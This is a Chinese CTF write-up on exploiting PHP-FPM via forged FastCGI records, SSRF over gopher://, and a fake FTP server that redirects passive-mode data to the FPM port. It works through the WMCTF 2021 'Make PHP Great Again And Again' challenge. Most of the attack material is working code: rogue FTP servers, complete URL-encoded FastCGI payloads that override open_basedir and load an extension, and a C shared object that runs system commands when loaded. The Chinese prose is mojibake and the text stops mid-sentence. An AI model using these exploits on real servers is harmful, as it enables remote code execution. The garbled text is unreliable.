ä¸ç”¨æ¯æ¬¡éƒ½è°ƒç”¨ä¸€ä¸‹cgiï¼Œæœ‰è¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å¤„ç†ç”±php-fpmæ¥å®ç°\né…ç½® php-fpmé€šä¿¡æ–¹å¼æœ‰tcpï¼ˆæœ¬åœ°ç›‘å¬9000ç«¯å£ï¼‰å’Œunix socketå¥—æ¥å­—ä¸¤ç§æ–¹å¼ï¼Œé¢˜ç›®ä¸­å¯ä»¥è§åˆ°çš„éƒ½æ˜¯tcp9000\napt update apt install nginx -y apt install software-properties-common -y apt install php7.4-fpm -y tcpæ¨¡å¼ /etc/php/7.4/fpm/pool.d/www.conf\nlisten = 127.0.0.1:9000 /etc/nginx/sites-enabled/default\nserver{ ... location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; } ... } unix socketæ¨¡å¼ å¦‚æœå¯åŠ¨fpmä¸åšæ”¹åŠ¨ï¼Œé»˜è®¤ä¸ºå¥—æ¥å­—æ¨¡å¼\n/etc/php/7.4/fpm/pool.d/www.conf\nlisten = /run/php/php7.4-fpm.sock /etc/nginx/sites-enabled/default\nserver{ ... location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.4-fpm.sock; } ... } ç„¶åé‡å¯å³å¯\nservice nginx start\t# reload /etc/init.d/php7.4-fpm start\t# restart å¦‚æœå‡ºç°æŠ¥é”™è¯·æŸ¥çœ‹å¯¹åº”æ—¥å¿—\ncat /var/log/nginx/error.log cat /var/log/php7.4-fpm.log æ¼æ´æˆå›  æŒ‰FastCGIåè®®ä¼ è¾“çš„å†…å®¹åˆ†ä¸ºheaderå’Œbodyä¸¤éƒ¨åˆ†\ntypedef struct { /* Header */ unsigned char version; // ç‰ˆæœ¬ unsigned char type; // æœ¬æ¬¡recordçš„ç±»å‹ unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id unsigned char requestIdB0; unsigned char contentLengthB1; // bodyä½“çš„å¤§å° unsigned char contentLengthB0; unsigned char paddingLength; // é¢å¤–å—å¤§å° unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record; å…ˆä»hederä¸­æ‹¿åˆ°bodyä½“å¤§å°ï¼ˆæœ€å¤§2^16=65535å­—èŠ‚ï¼‰ï¼Œå†ä»tcpæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLenthçš„bodyï¼Œä¹‹åè¿˜æœ‰ä¸€éƒ¨åˆ†é¢å¤–çš„padding\nheaderä¸­çš„typeèµ·åˆ°æŒ‡å®šrecordçš„ä½œç”¨ï¼Œå› ä¸ºFastCGIçš„å•ä¸ªrecordå¤§å°æœ‰é™ä½œç”¨å•ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPæµä¸­ä¼ è¾“å¤šä¸ªrecordï¼Œé€šè¿‡typeæ¥æ ‡è¯†æ¯ä¸ªrecordçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼ŒrequestIdåšåˆ°åŒºåˆ†æ¯ä¸€æ¬¡çš„è¯·æ±‚\nå½“type=4æ—¶ï¼Œè¡¨æ˜æ¶ˆæ¯ä¸­åŒ…å«çš„æ•°æ®ä¸ºæŸä¸ªname-valueå¯¹ï¼Œæ¯”å¦‚\n{ \u0026#39;GATEWAY_INTERFACE\u0026#39;: \u0026#39;FastCGI/1.0\u0026#39;, \u0026#39;REQUEST_METHOD\u0026#39;: \u0026#39;GET\u0026#39;, \u0026#39;SCRIPT_FILENAME\u0026#39;: \u0026#39;/var/www/html/index.php\u0026#39;, \u0026#39;SCRIPT_NAME\u0026#39;: \u0026#39;/index.php\u0026#39;, \u0026#39;QUERY_STRING\u0026#39;: \u0026#39;?a=1\u0026amp;b=2\u0026#39;, \u0026#39;REQUEST_URI\u0026#39;: \u0026#39;/index.php?a=1\u0026amp;b=2\u0026#39;, \u0026#39;DOCUMENT_ROOT\u0026#39;: \u0026#39;/var/www/html\u0026#39;, \u0026#39;SERVER_SOFTWARE\u0026#39;: \u0026#39;php/fcgiclient\u0026#39;, \u0026#39;REMOTE_ADDR\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;REMOTE_PORT\u0026#39;: \u0026#39;12345\u0026#39;, \u0026#39;SERVER_ADDR\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;SERVER_PORT\u0026#39;: \u0026#39;80\u0026#39;, \u0026#39;SERVER_NAME\u0026#39;: \u0026#34;localhost\u0026#34;, \u0026#39;SERVER_PROTOCOL\u0026#39;: \u0026#39;HTTP/1.1\u0026#39; } å…¶ä¸­SCRIPT_FILENAMEå°±æ˜¯php-fpmä¼šå»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”±äº5.3.9ç‰ˆæœ¬å¼•å…¥äº†security.limit_extensionsçš„é€‰é¡¹ï¼Œé»˜è®¤å¯¹åç¼€åé™åˆ¶åœ¨äº†phpå®¶æ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ‰¾åˆ°å·²å­˜åœ¨phpæ–‡ä»¶ï¼ˆå®‰è£…æ—¶é™„å¸¦çš„phpæ–‡ä»¶ å¯ä»¥é€šè¿‡find / -name \u0026quot;*.php\u0026quot;æ¥æœç´¢ä¸€ä¸‹é»˜è®¤ç¯å¢ƒ æ¯”å¦‚/usr/local/lib/php/PEAR.phpï¼‰ï¼Œå‘å…¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›è€Œfpmæ”¯æŒé€šè¿‡è®¾ç½®FASTCGI_PARAMSæ¥åŠ¨æ€ä¿®æ”¹phpçš„è®¾ç½®ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸¤é¡¹\n\u0026#39;PHP_VALUE\u0026#39;: \u0026#39;auto_prepend_file = php://input\u0026#39;, \u0026#39;PHP_ADMIN_VALUE\u0026#39;: \u0026#39;allow_url_include = On\u0026#39; æ¥åšåˆ°æ‰§è¡ŒæŸphpæ–‡ä»¶æ—¶è‡ªåŠ¨åŒ…å«POSTå†…å®¹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆdisable_functionåœ¨phpåŠ è½½æ—¶å°±ç¡®å®šå¥½äº†ï¼Œæ— æ³•é‡å†™ï¼‰\næ”»å‡»æ€è·¯\u0026amp;\u0026amp;ä¾‹é¢˜ ä¼ªé€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸é€šä¿¡çš„FastCGIå®¢æˆ·ç«¯ï¼Œå°†ä¼ è¾“çš„å†…å®¹ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadï¼Œå†å‘å‡ºå»\nè¿œç¨‹æ”»å‡»php-fpm è¿™é‡Œæ˜¯pç‰›çš„è„šæœ¬ï¼Œå…¼å®¹py2\u0026amp;3ï¼Œé»˜è®¤-p 9000ï¼Œ-c \u0026lt;?php phpinfo();?\u0026gt;\npython fpm.py target_ip /var/www/html/index.php -c \u0026#39;\u0026lt;?php echo `id`;exit;?\u0026gt;\u0026#39; æˆ‘ä»¬éœ€è¦æ”¹åŠ¨çš„åªæœ‰paramséƒ¨åˆ†çš„PHP_ADMIN_VALUE\n\u0026#39;PHP_ADMIN_VALUE\u0026#39;: \u0026#39;allow_url_include = On\\nextension = /home/amelia/TEMP/fpm/wuhu.so\u0026#39;, æˆåŠŸ\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœåªæ˜¯åŠ è½½æ¶æ„.soè€Œä¸æ‰§è¡Œä»£ç ï¼Œåˆ™å¹¶ä¸éœ€è¦æœ‰å·²å­˜åœ¨phpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç”¨_å ä½å³å¯\npython fpm.py target_ip _ -c \u0026#39;\u0026lt;?php echo `id`;exit;?\u0026gt;\u0026#39; SSRFæ”»å‡»æœ¬åœ°php-fpm åˆ©ç”¨gopher://åè®®å¯ä»¥ç›´æ¥ä¼ è¾“TCPåè®®æµï¼Œæˆ‘ä»¬æ„é€ å¥½payloadä¹‹åå°±å¯ä»¥ä¼ å…¥è¿›è¡Œssrfæ”»å‡»äº†\næ„é€ payloadä¾æ—§ä½¿ç”¨pç‰›çš„è„šæœ¬ï¼Œä¸è¿‡åšä¸€ç‚¹å¾®å°çš„æ”¹åŠ¨ï¼›è¿™éƒ¨åˆ†å¯ä»¥å‚è§åé¢ç»“åˆftpæ”»å‡»fpmçš„å†…å®¹ï¼Œæ€»ä¹‹å°±ç…§è¿™å‡ æ­¥èµ°\npç‰›è„šæœ¬ç”Ÿæˆurlencodeä¹‹åçš„tcpæ•°æ®æµ åŠ gopher://127.0.0.1:9000å‰ç¼€ æ¢­ï¼?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx [å¼ºç½‘é’å°‘ 2021]SSRF \u0026lt;?php highlight_file(__FILE__); //like fpm? class Crawl{ public $url; function __construct($url){ if(substr($url,0,7)===\u0026#34;http://\u0026#34;){ $this-\u0026gt;url = $url; }else{ $this-\u0026gt;url = \u0026#34;http://127.0.0.1/\u0026#34;; } } public function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo $result; } function __destruct(){ $this-\u0026gt;curl($this-\u0026gt;url); } } if($_COOKIE[\u0026#34;login\u0026#34;]==\u0026#39;1\u0026#39;){ unserialize($_COOKIE[\u0026#34;crawldata\u0026#34;]); }else{ if(isset($_GET[\u0026#34;url\u0026#34;])){ $crl = new Crawl($_GET[\u0026#34;url\u0026#34;]); }else{ echo \u0026#34;no\u0026#34;; } } ?\u0026gt; ç”¨pç‰›è„šæœ¬ç”Ÿæˆpayloadï¼Œç›´æ¥ssrfä¼ªåè®®å¥½åƒä¹Ÿè¡Œï¼Ÿæ²¡ç¯å¢ƒï¼Œäº‘ä¸€ä¸‹äº†\n$a = new Crawl(); $a -\u0026gt; url = \u0026#34;gopher://127.0.0.1:9001/_xxxxxxxx\u0026#34;; // $a -\u0026gt; url = \u0026#34;dict://127.0.0.1:80/info\u0026#34;; // $a -\u0026gt; url = \u0026#34;file:///proc/net/arp\u0026#34;; echo urlencode(serialize($a)); å°†åºåˆ—åŒ–ä¹‹åçš„ç»“æœä¼ å…¥crawldata\nç»“åˆftp\u0026amp;PASV modeæ”»å‡»æœ¬åœ°php-fpm ftpä½¿ç”¨PASVæ¨¡å¼è½¬å‘ftp-data å…ˆç®€å•æµ‹è¯•ftpè¿æ¥è¿›è¡ŒæŠ“åŒ…\nå…¶ä¸­çš„227 Entering Passive Mode (192,168,187,3,230,20)çš„æ‹¬å·å†…çš„å†…å®¹è¡¨ç¤ºçš„æ˜¯ä¼ è¾“çš„FTP-DATAæ‰“å‘çš„ä½ç½®ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯ipï¼Œç«¯å£æ˜¯230*256+20=58900\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–‡ä»¶å†…å®¹æ˜¯150okä¹‹åæ‰è¢«ä¼ å‡ºå»çš„ï¼Œè€Œä¸”ä¼šè¢«æ”¾åœ¨FTP-DATAä¸­è¢«ä¸Šä¼ å’Œä¸‹è½½\næˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªftp-serverï¼Œåœ¨å“åº”PASVå‘½ä»¤ï¼ˆå³passive åˆ‡æ¢è¢«åŠ¨æ¨¡å¼ï¼‰æ—¶è¿”å›(127,0,0,1,0,12345)æ¥è®©FTP-DATAæ‰“å‘å†…ç½‘12345ç«¯å£ï¼›è¿™æ˜¯ä¸€ä¸ªæ¶æ„ftp-server\n# 192.168.187.1 import socket print(\u0026#34;[+] listening ...........\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 9999)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 (vsFTPd 3.0.3)\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;331 Please specify the password.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;230 Login successful.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#34;215 UNIX Type: L8\\r\\n\u0026#34;) conn.recv(0xff) conn.send(b\u0026#39;200 Switching to Binary mode.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;227 Entering Passive Mode (127,0,0,1,0,12345).\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;150 Ok to send data.\\r\\n\u0026#39;) # sending payload ..... conn.send(b\u0026#39;226 Transfer complete.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;221 Goodbye.\\r\\n\u0026#39;) conn.close() print(\u0026#34;[+] completed ~~\u0026#34;) åœ¨å¦ä¸€å°192.168.187.3ä¸Šè®¿é—®è¿™ä¸ªæ¶æ„æœåŠ¡ï¼ŒæœŸé—´ä¼ è¾“çš„æ–‡ä»¶å°±ä¼šè¢«è½¬å‘åˆ°192.168.187.3è‡ªå·±çš„12345ç«¯å£\nphpåŠ è½½æ¶æ„.soæ–‡ä»¶ ä¿®æ”¹php.ini /etc/php/7.4/cli/php.ini\n[PHP] extension=/home/amelia/TEMP/fpm/wuhu.so Cæºç \n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;touch /home/amelia/TEMP/fpm/pwned\u0026#34;); } ç¼–è¯‘ä¸º.so\ngcc wuhu.c -o wuhu.so --shared -fPIC è¿è¡Œphpå³è§¦å‘æ¶æ„.so\nä»¤phpä½¿ç”¨ftp:// /etc/php/7.4/cli/php.ini\nallow_url_fopen = On ftpè¯» æ³¨æ„åé¢çš„è·¯å¾„éƒ½éœ€è¦ç»å¯¹è·¯å¾„\n\u0026lt;?php @var_dump(file_get_contents($argv[1])); php ftp_read.php \u0026#39;ftp://test:test@192.168.187.3/home/test/flag.txt\u0026#39; ftpå†™\n\u0026lt;?php @var_dump(file_put_contents($argv[1], $agrv[2])); php ftp_write.php \u0026#39;ftp://test:test@192.168.187.3/home/test/test.txt\u0026#39; \u0026#39;hello, world\u0026#39; ä½†æ˜¯è¿™é‡Œä¸€ç›´æ˜¯å¯ä»¥æ–°å»ºæ–‡ä»¶ä½†æ˜¯å†™å…¥ä¸äº†ï¼Œè¯»å…¥çš„å‚æ•°2ä¸€ç›´æ˜¯int(0)ï¼Œæš‚æ—¶è¿˜æ²¡è§£å†³é—®é¢˜ï¼ˆä¸è¿‡ç”¨ä¸‹é¢é‚£ä¸ªå†™å…¥å¾ˆæ­£å¸¸â€¦â€¦\nè¦†ç›–å·²å­˜åœ¨æ–‡ä»¶\n\u0026lt;?php $context = stream_context_create(array(\u0026#39;ftp\u0026#39; =\u0026gt; array(\u0026#39;overwrite\u0026#39; =\u0026gt; true))); @var_dump(file_put_contents($argv[1], $argv[2], 0, $context)); php ftp_write_2.php \u0026#39;ftp://test:test@192.168.187.3/home/test/test.txt\u0026#39; \u0026#39;newwwwew\u0026#39; ä»¤phpä½¿ç”¨ftp://å¹¶è½¬å‘FTP-DATA å°†ä¸Šé¢çš„æ“ä½œç”¨wiresharkæŠ“ä¸ªåŒ…çœ‹çœ‹æµé‡\nå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯EPSV modeè€Œä¸æ˜¯PASV modeï¼Œä¸ä¼šæœ‰æ‹¬å·å†…çš„ip+portæè¿°ï¼ŒFTP-DATAåªä¼šè¢«æ‰“å‘æ§åˆ¶è¿æ¥çš„æœåŠ¡ç«¯çš„ç«¯å£ï¼Œä¸èƒ½åšåˆ°FTP-DATAçš„ä»»æ„è½¬å‘\nä¸è¿‡ä¹Ÿä¸æ˜¯æ¯«æ— åŠæ³•ï¼Œå¦‚æœç”¨EPSVå‘½ä»¤è¿”å›çš„ç»“æœä¸æ˜¯229ï¼Œé‚£ä¹ˆphpçš„ftp://å°±ä¼šä½¿ç”¨PASVå‘½ä»¤\nå°†ä¸Šé¢çš„ftp-serverä¿®æ”¹ä¸€ä¸‹ï¼Œå°†229å“åº”è®¾ä¸ºäº†000\nimport socket print(\u0026#34;[+] listening ...........\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 9999)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 (vsFTPd 3.0.3)\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;331 Please specify the password.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;230 Login successful.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;200 Switching to Binary mode.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#34;550 Could not get file size.\\r\\n\u0026#34;) print(conn.recv(0xff)) # responese with 000 , not 229 conn.send(b\u0026#39;000 use PASV then\\r\\n\u0026#39;) # then php will send PASV command print(conn.recv(0xff)) # response to PASV command conn.send(b\u0026#39;227 Entering Passive Mode (127,0,0,1,0,12345).\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;150 Ok to send data.\\r\\n\u0026#39;) # sending payload ..... conn.send(b\u0026#39;226 Transfer complete.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;221 Goodbye.\\r\\n\u0026#39;) conn.close() print(\u0026#34;[+] completed ~~\u0026#34;) æˆåŠŸè½¬å‘\nä½¿ç”¨ftp://å°†payloadæ‰“å‘fpm ç»“åˆä¸Šé¢å‡ ä¸ªå®ä¾‹åº”è¯¥å°±å¾ˆæ¸…æ™°äº†ï¼Œæ€è·¯å°±æ˜¯ï¼š\nç¼–å†™åŒ…å«æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„.so æ‰“å‘fpmçš„ä¸€æ³¢æµé‡ï¼Œç”¨äºè§£å¼€open_basedir, allow_url_includeç­‰çš„é™åˆ¶ï¼Œå½¢å¼æ˜¯file_put_contents(\u0026lsquo;ftp://xxx\u0026rsquo;,$payload) ç”¨file_put_contents(\u0026rsquo;/tmp/wuhu.so\u0026rsquo;,$_POST[\u0026lsquo;data\u0026rsquo;])çš„å½¢å¼å°†.soä¼ å…¥ å¦‚æœé¡ºåˆ©çš„è¯open_basedirè§£å¼€é™åˆ¶ï¼Œ.soè¢«åŒ…å«ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ.soä¸­çš„ä»£ç åšåˆ°rceäº† è¿™é‡Œçš„å®Œç¾æ —å­å½“ç„¶æ˜¯èµµæ€»çš„ä¸‰å¥è¯ï¼ˆæŒ‡è·¯èµµæ€»åšå®¢-\u0026gt;WMCTF2021-Web-Make PHP Great Again And Again WriteUp\n[WMCTF 2021]Make PHP Great Again And Again æ€è·¯å…ˆæ”¾åœ¨å‰é¢ï¼šæ‰¾åˆ°fpmç«¯å£-\u0026gt;æ­å»ºæ¶æ„ftp_server å°†.soæ–‡ä»¶è½¬å‘è‡³fpmç«¯å£-\u0026gt;åˆ©ç”¨.soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤-\u0026gt;æ‹¿flag\né¢˜ç›®ä»£ç åªæœ‰ä¸‰å¥è¯\n\u0026lt;?php highlight_file(__FILE__); @eval($_GET[\u0026#39;glzjin\u0026#39;]); ç›´æ¥çœ‹phpinfo();ä¼š500ï¼Œç”¨get_cfg_varè·å–é…ç½®é¡¹\n/?glzjin=var_dump(get_cfg_var(%27disable_functions%27)); string(657) \u0026#34;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive\u0026#34; åªèƒ½è¯´è¯¥ç¦çš„éƒ½ç¦äº†ï¼›å†åº·åº·allow_url_fopenå’Œinclude\nstring(1) \u0026#34;1\u0026#34; string(0) \u0026#34;\u0026#34; å†åº·åº·open_basedir\n/?glzjin=var_dump(get_cfg_var(%27open_basedir%27)); string(14) \u0026#34;/var/www/html/\u0026#34; emmmmmmmmm è¿™ä¸ªä¹‹åä¹Ÿéœ€è¦ç»•è¿‡\nç”¨tcp://ä¼ªåè®®æ‰«ä¸€ä¸‹æœ¬æœºå¼€æ”¾çš„ç«¯å£\nfor($i=0;$i\u0026lt;65535;$i++) { $t=stream_socket_server(\u0026#34;tcp://0.0.0.0:\u0026#34;.$i,$ee,$ee2); if($ee2 === \u0026#34;Address already in use\u0026#34;) { var_dump($i); } } æˆ–è€…file_get_contentså’Œerror_get_lastè·å–åˆ°è¯·æ±‚ä¸­å‘å‡ºçš„é”™è¯¯è¿›è¡Œå¾ªç¯åˆ¤æ–­ä¹Ÿå¯ä»¥è¿›è¡Œç«¯å£æ‰«æ\nfor($i=0;$i\u0026lt;65535;$i++) { $t=file_get_contents(\u0026#39;http://127.0.0.1:\u0026#39;.$i); if(!strpos(error_get_last()[\u0026#39;message\u0026#39;], \u0026#34;Connection refused\u0026#34;)) { var_dump($i); } } int(11451) int(37114) int(48748) æ‰¾åˆ°äº†fpmç«¯å£11451\nä¹‹åå°±ç»­ä¸Šäº†æˆ‘ä»¬å‰é¢çš„æ€è·¯ï¼Œå…ˆåœ¨æœ¬åœ°ï¼ˆä¹Ÿå°±æ˜¯é¶æœºçš„æœ¬åœ°ï¼‰èµ·ä¸€ä¸ªæ¶æ„çš„ftp_serveræœåŠ¡ç”¨æ¥è½¬å‘FTP-DATAï¼ˆå³.soæ–‡ä»¶ï¼‰è‡³fpmç«¯å£ï¼ˆ11451ï¼‰ï¼›è¿™é‡Œçš„expæ˜¯phpç‰ˆçš„ï¼ŒåŸç†è·Ÿä¸Šé¢çš„pyç‰ˆæ˜¯ä¸€æ ·çš„\n$socket = stream_socket_server(\u0026#34;tcp://0.0.0.0:46819\u0026#34;, $errno, $errstr); if (!$socket) { echo \u0026#34;$errstr ($errno)\u0026lt;br /\u0026gt;\\n\u0026#34;; } else { while ($conn = stream_socket_accept($socket)) { fwrite($conn, \u0026#34;210 Fake FTP\\n\u0026#34;); $line = fgets($conn); echo $line; // USER fwrite($conn, \u0026#34;230 Login successful\\n\u0026#34;); $line = fgets($conn); echo $line; // TYPE fwrite($conn, \u0026#34;200 xx\\n\u0026#34;); $line = fgets($conn); echo $line; // SIZE fwrite($conn, \u0026#34;550 xx\\n\u0026#34;); $line = fgets($conn); echo $line; // EPSV fwrite($conn, \u0026#34;500 wtf\\n\u0026#34;); $line = fgets($conn); echo $line; // PASV // $ip = \u0026#39;192.168.1.4\u0026#39;; $ip = \u0026#39;127.0.0.1\u0026#39;; $port = 11451; $porth = floor($port / 256); $portl = $port % 256; fwrite($conn, \u0026#34;227 Entering Passive Mode. \u0026#34;.str_replace(\u0026#39;.\u0026#39;,\u0026#39;,\u0026#39;,$ip).\u0026#34;,$porth,$portl\\n\u0026#34;); $line = fgets($conn); echo $line; // STOR fwrite($conn, \u0026#34;125 GOGOGO!\\n\u0026#34;); sleep(1); fwrite($conn, \u0026#34;226 Thanks!\\n\u0026#34;); fclose($conn); } fclose($socket); } urlencodeä¹‹åä¼ å…¥ï¼Œå†æ‰«ä¸€ä¸‹ç«¯å£å¯ä»¥çœ‹åˆ°46819å¼€æ”¾ï¼Œè¯´æ˜æœåŠ¡æ­£å¸¸ï¼›è¿˜æ˜¯ç”¨ä¹‹å‰pç‰›çš„è„šæœ¬æ„é€ ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹çš„é…ç½®é¡¹æ˜¯è¿™äº›\n\u0026#39;PHP_ADMIN_VALUE\u0026#39;: \u0026#39;allow_url_include = On\\nopen_basedir = /\\nextension = /tmp/wuhu.so\u0026#39;, è¦†ç›–æ‰open_basedirçš„åŸæœ‰è®¾ç½®ï¼Œå†åŠ ä¸Š.soæ–‡ä»¶ï¼ˆç¨åä¸Šä¼ ï¼‰ï¼›å…·ä½“çš„payloadä¹Ÿå¯ä»¥ç”¨pç‰›çš„è„šæœ¬é­”æ”¹ä¸€ä¸‹\næ³¨é‡Šæ‰157-159å¯¹è¿æ¥çŠ¶æ€çš„åˆ¤æ–­ï¼Œåœ¨191åˆ›å»ºè¿æ¥å‰å°†requestéƒ¨åˆ†ç›´æ¥è¾“å‡ºurlencodeçš„ç‰ˆæœ¬ç„¶åexit(0)ä¸€æ³¢é€€å‡º\n$ python fpm.py 127.0.0.1 \u0026#39;/var/www/html/index.php\u0026#39; %01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00 /?glzjin=eval($_POST[%27a%27]); POST: a=$payload=urldecode(\u0026#39;%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00\u0026#39;);var_dump(file_put_contents(\u0026#39;ftp://127.0.0.1:46819/wuhu\u0026#39;,$payload)); å†™æ¶æ„.so\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; __attribute__ ((__constructor__)) void preload (void) { system(\u0026#34;ls / -al \u0026gt; /tmp/p1.txt\u0026#34;); system(\u0026#34;find / -perm -4000 2\u0026gt;/tmp/p2.txt\u0026#34;); system(\u0026#34;cat /flag \u0026gt; /tmp/p3.txt\u0026#34;); } gcc wuhu.c -o wuhu.so --shared -fPIC ä¼ .so\n/?glzjin=eval($_POST[%27a%27]); POST: a=var_dump(file_put_contents(\u0026#39;/tmp/wuhu.so\u0026#39;,$_POST[\u0026#39;data\u0026#39;]));\u0026amp;data=xxxxxxxxxxxxxxxxxxx è¯•ç€æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸè§£é™¤open_basedirçš„é™åˆ¶\nä½†æ˜¯ä¸€æ ·çš„æ“ä½œä¹‹åå°±æ‰§è¡Œä¸äº†äº†â€¦â€¦å°±ä¸Šé¢è¿™ä¸ªé¡µé¢ï¼Œå°±æ­£å¸¸å‡ºæ¥äº†ç¬¬ä¸€æ¬¡ï¼Œç„¶åå°±ä¸è¡Œäº†ï¼Œéå¸¸çš„ç¦»è°±å•Šå•Šå•Šå•Šå•Š\næ­£å¸¸æ¥è¯´ï¼Œåªæœ‰open_basedirè¢«è§£æ”¾åæ‰å¯ä»¥scandir(\u0026rsquo;/\u0026rsquo;)ï¼ˆæ²¡æœ‰çš„è¯æ˜¯åªå¯ä»¥scandir(\u0026rsquo;/var/www/html\u0026rsquo;)ï¼‰ï¼Œè€Œæ—¢ç„¶è¿™æ ·å¯ä»¥æ‰§è¡ŒæˆåŠŸå°±è¯´æ˜å¼€å§‹çš„fpmæµé‡ä¸€å®šè¢«æ­£å¸¸æ‰“å‡ºå»äº†ï¼Œå†åŠ 